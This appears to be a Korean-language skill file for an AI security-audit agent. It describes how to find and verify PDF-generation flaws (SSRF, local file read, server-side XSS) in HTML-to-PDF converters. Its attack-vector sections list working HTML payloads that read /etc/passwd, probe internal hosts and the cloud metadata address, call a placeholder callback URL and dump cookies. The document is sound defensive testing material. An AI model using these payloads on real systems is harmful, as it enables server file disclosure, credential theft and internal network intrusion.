---
name: pdf-generation-scanner
description: "소스코드 분석과 동적 테스트를 통해 PDF 생성 기능의 보안 취약점을 탐지하는 스킬. HTML-to-PDF 변환 시 사용자 입력이 HTML에 삽입되어 SSRF, LFI, XSS 등이 발생할 수 있는지 분석하고 검증한다. 사용자가 'PDF 생성 취약점 찾아줘', 'HTML to PDF 취약점', 'PDF 스캔', 'wkhtmltopdf 취약점', 'puppeteer PDF 취약점', 'PDF SSRF', 'PDF LFI', 'PDF generation audit' 등을 요청할 때 이 스킬을 사용한다."
grep_patterns:
  - "wkhtmltopdf"
  - "puppeteer"
  - "WeasyPrint"
  - "PDFKit"
  - "prawn"
  - "html-pdf"
  - "pdf-creator-node"
  - "pdfmake"
  - "html.*pdf"
  - "pdf.*generat"
  - "playwright.*pdf"
---

# PDF Generation Scanner

소스코드 분석으로 PDF 생성 기능의 취약점 후보를 식별한 뒤, 동적 테스트로 실제로 PDF 생성 과정에서 SSRF, LFI, XSS 등이 발생하는지 검증하여 확인된 취약점만 보고하는 스킬이다.

## 핵심 원칙: "PDF에 의도하지 않은 내용이 포함되지 않으면 취약점이 아니다"

PDF 생성 기능이 있다고 바로 취약점으로 보고하지 않는다. 사용자가 제어한 입력이 PDF 생성 과정의 HTML에 삽입되어 실제로 로컬 파일 내용이 PDF에 포함되거나, 내부 서비스로 요청이 발생하거나, JavaScript가 실행되는 것을 확인해야 취약점이다.

## PDF 생성 취약점의 원리

HTML-to-PDF 변환 라이브러리(wkhtmltopdf, Puppeteer, WeasyPrint 등)는 내부적으로 브라우저 엔진을 사용하여 HTML을 렌더링한다. 이 과정에서:
- `<script>` 태그의 JavaScript가 **서버에서** 실행됨
- `<img>`, `<link>`, `<iframe>` 등이 **서버에서** 리소스를 로드함
- `file://` 프로토콜로 **서버의 로컬 파일**에 접근 가능
- 내부 네트워크 URL로 **SSRF** 가능

이는 일반적인 XSS/SSRF와 다르게, 공격이 **서버의 PDF 렌더링 엔진 내부**에서 발생한다.

## 취약점의 유형

### PDF를 통한 LFI (Local File Read)
PDF 생성 시 `file:///etc/passwd` 같은 로컬 파일 경로를 삽입하여 서버의 파일 내용을 PDF에 포함시키는 공격.

**공격 벡터:**
```html
<!-- iframe으로 로컬 파일 포함 -->
<iframe src="file:///etc/passwd" width="800" height="500"></iframe>

<!-- object/portal 태그 -->
<object data="file:///etc/passwd" width="800" height="500">
<portal src="file:///etc/passwd" width="800" height="500">

<!-- XMLHttpRequest로 파일 읽기 -->
<script>
  x = new XMLHttpRequest();
  x.onload = function(){ document.write(this.responseText) };
  x.open("GET", "file:///etc/passwd");
  x.send();
</script>

<!-- Base64 인코딩으로 바이너리 파일 추출 -->
<script>
  x = new XMLHttpRequest();
  x.onload = function(){ document.write(btoa(this.responseText)) };
  x.open("GET", "file:///etc/passwd");
  x.send();
</script>

<!-- PDF 라이브러리 전용 태그 -->
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="LFI" />
<pd4ml:attachment src="/etc/passwd" description="LFI" icon="Paperclip"/>
```

### PDF를 통한 SSRF
PDF 생성 시 내부 네트워크 URL이나 외부 콜백 URL을 삽입하여 서버가 해당 주소로 요청을 보내도록 하는 공격.

**공격 벡터:**
```html
<!-- img/link/iframe으로 내부 서비스 접근 -->
<img src="http://127.0.0.1:8080/api/users"/>
<link rel="stylesheet" href="http://169.254.169.254/latest/meta-data/">
<iframe src="http://127.0.0.1:8080/admin" width="800" height="500"></iframe>

<!-- 외부 콜백으로 SSRF 확인 -->
<img src="http://CALLBACK_URL/ssrf-pdf-test"/>
```

### PDF를 통한 XSS (Server-Side)
PDF 렌더링 엔진 내부에서 JavaScript가 실행되어 서버 환경 정보를 노출하는 공격.

**공격 벡터:**
```html
<!-- 서버 환경 정보 노출 -->
<script>document.write(window.location)</script>
<script>document.write(document.domain)</script>

<!-- 쿠키/토큰 탈취 (렌더링 컨텍스트) -->
<script>document.write(document.cookie)</script>
```

### Redirect + LFI 체인
리다이렉트를 통해 `file://` 프로토콜로 전환하는 공격. 서버에 리다이렉트 엔드포인트가 있으면 이를 경유하여 LFI를 수행.

**공격 벡터:**
```html
<!-- 리다이렉트 서버를 경유한 LFI -->
<iframe src="http://internal-server/redirect?url=file:///etc/passwd" width="800" height="500"></iframe>
```

## 분석 프로세스

이 스캐너의 분석은 두 단계로 구성된다:

1. **Phase 1 (소스코드 분석)**: `phase1.md` 참조
2. **Phase 2 (동적 테스트)**: `phase2.md` 참조

개별 실행 시, 이 디렉토리의 `phase1.md`와 `phase2.md`를 순서대로 읽고 수행한다.
공통 유의사항은 이 스킬과 같은 skills 디렉토리 내의 `noah-sast/agent-guidelines.md`를 참조한다. 이 파일의 위치를 기준으로 `../noah-sast/agent-guidelines.md` 경로로 접근할 수 있다.
